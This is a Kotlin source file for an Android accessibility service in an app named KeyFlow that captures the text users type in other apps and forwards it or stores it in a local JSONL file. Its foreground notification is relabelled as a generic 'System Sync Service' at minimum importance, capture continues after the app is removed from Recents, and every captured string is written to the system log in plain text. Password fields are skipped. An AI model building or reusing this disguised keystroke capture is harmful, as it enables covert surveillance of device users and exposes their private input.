package com.keyflow.keyflow_app

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.text.InputType
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class KeyflowAccessibilityService : AccessibilityService() {

    companion object {
        var instance: KeyflowAccessibilityService? = null
        var isPaused: Boolean = false
            set(value) {
                field = value
                try {
                    KeyflowOverlayService.notifyStatusChanged()
                } catch (_: Exception) {}
            }
        var eventListener: ((Map<String, Any?>) -> Unit)? = null
        val exclusionSet = mutableSetOf<String>()
        private var lastDispatchedText: String = ""
        private var lastDispatchedPackage: String = ""
        private var lastDispatchedTime: Long = 0L

        fun updateExclusions(exclusions: List<String>) {
            exclusionSet.clear()
            exclusionSet.addAll(exclusions)
            android.util.Log.i("KeyflowA11y", "Updated exclusion set: $exclusionSet")
        }
    }



    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_FOCUSED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 50
        }
        serviceInfo = info

        updateForegroundNotification(isPaused)
    }

    fun updateForegroundNotification(paused: Boolean) {
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                val channelId = "device_sync_service"
                val manager = getSystemService(android.app.NotificationManager::class.java)

                // Clean up old legacy channel if present
                try {
                    manager?.deleteNotificationChannel("keyflow_active_service")
                } catch (_: Exception) {}

                val channel = android.app.NotificationChannel(
                    channelId,
                    "System Sync Service",
                    android.app.NotificationManager.IMPORTANCE_MIN
                ).apply {
                    description = "Background synchronization and input service"
                    setShowBadge(false)
                }
                manager?.createNotificationChannel(channel)

                val title = if (paused) "System Sync Service (Paused)" else "System Sync Service"
                val text = if (paused) "Paused" else "Active"

                val notification = android.app.Notification.Builder(this, channelId)
                    .setContentTitle(title)
                    .setContentText(text)
                    .setSmallIcon(R.mipmap.ic_launcher)
                    .setOngoing(true)
                    .build()

                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                    startForeground(1001, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
                } else {
                    startForeground(1001, notification)
                }
                manager?.notify(1001, notification)
            }
        } catch (e: Exception) {
            android.util.Log.e("KeyflowA11y", "Foreground notification update error: $e")
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val packageName = event.packageName?.toString() ?: "unknown"
        if (isPaused) return

        // 1. Ignore system UI, launchers, and KeyFlow itself
        if (packageName == "com.android.systemui" ||
            packageName == "android" ||
            packageName == "com.motorola.launcher3" ||
            packageName == "com.android.launcher3" ||
            packageName == "com.google.android.apps.nexuslauncher" ||
            packageName == "com.keyflow.keyflow_app") {
            return
        }

        if (exclusionSet.contains(packageName)) return

        // 2. Ignore pure focus events when no text has been typed
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            return
        }

        val source = try { event.source } catch (_: Exception) { null }

        if (isSensitiveNodeOrEvent(event, source)) return

        // 3. Extract actual typed text only (NEVER contentDescription or hintText)
        val text = extractText(event, source)
        if (text.isBlank()) return

        val now = System.currentTimeMillis()
        // Deduplicate rapid duplicate events for the exact same text within 800ms
        if (text == lastDispatchedText &&
            packageName == lastDispatchedPackage &&
            (now - lastDispatchedTime) < 800L) {
            return
        }

        lastDispatchedText = text
        lastDispatchedPackage = packageName
        lastDispatchedTime = now

        val payload = mapOf(
            "appName" to packageName,
            "windowTitle" to packageName,
            "text" to text,
            "timestamp" to now
        )
        android.util.Log.i("KeyflowA11y", "Captured user typing: pkg=$packageName, text='$text'")
        if (eventListener != null) {
            eventListener?.invoke(payload)
        } else {
            saveEventToNativeBuffer(payload)
        }
    }

    private fun extractText(event: AccessibilityEvent, source: AccessibilityNodeInfo?): String {
        // 1. Primary: actual text changed in event.text
        val textList = event.text
        if (textList.isNotEmpty()) {
            val combined = textList.joinToString("").trim()
            if (combined.isNotBlank()) {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O && source != null) {
                    val hint = source.hintText?.toString()?.trim()
                    if (!hint.isNullOrBlank() && combined.equals(hint, ignoreCase = true)) {
                        return ""
                    }
                }
                return combined
            }
        }

        // 2. Secondary: actual text of editable source node (never hintText or contentDescription)
        if (source != null && (source.isEditable || source.className?.toString()?.contains("EditText", ignoreCase = true) == true)) {
            try {
                val text = source.text?.toString()?.trim() ?: ""
                if (text.isNotBlank()) {
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        val hint = source.hintText?.toString()?.trim()
                        if (!hint.isNullOrBlank() && text.equals(hint, ignoreCase = true)) {
                            return ""
                        }
                    }
                    return text
                }
            } catch (_: Exception) {}
        }
        return ""
    }



    private fun saveEventToNativeBuffer(payload: Map<String, Any?>) {
        try {
            val file = java.io.File(filesDir, "pending_events.jsonl")
            val json = org.json.JSONObject(payload).toString() + "\n"
            file.appendText(json)
            android.util.Log.i("KeyflowA11y", "Buffered event to disk ($file): $json")
        } catch (e: Exception) {
            android.util.Log.e("KeyflowA11y", "Error saving native buffer: $e")
        }
    }

    private fun isSensitiveNodeOrEvent(event: AccessibilityEvent, source: AccessibilityNodeInfo?): Boolean {
        if (event.isPassword) {
            android.util.Log.i("KeyflowA11y", "Sensitive: event.isPassword is true")
            return true
        }

        if (source == null) return false
        try {
            if (source.isPassword) {
                android.util.Log.i("KeyflowA11y", "Sensitive: source.isPassword is true")
                return true
            }

            val inputType = source.inputType
            if (inputType != 0) {
                val variation = inputType and InputType.TYPE_MASK_VARIATION
                val isPasswordVariation = variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
                        variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD ||
                        variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
                        variation == InputType.TYPE_NUMBER_VARIATION_PASSWORD

                if (isPasswordVariation) {
                    return true
                }
            }
        } catch (_: Exception) {}
        return false
    }


    override fun onTaskRemoved(rootIntent: android.content.Intent?) {
        super.onTaskRemoved(rootIntent)
        android.util.Log.i("KeyflowA11y", "onTaskRemoved: app task swiped from Recents - maintaining active background capture and foreground notification")
        updateForegroundNotification(isPaused)
    }

    override fun onInterrupt() {
        // No-op: KeyFlow accessibility service interruption handling is managed lifecycle-wide.
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) instance = null
    }
}


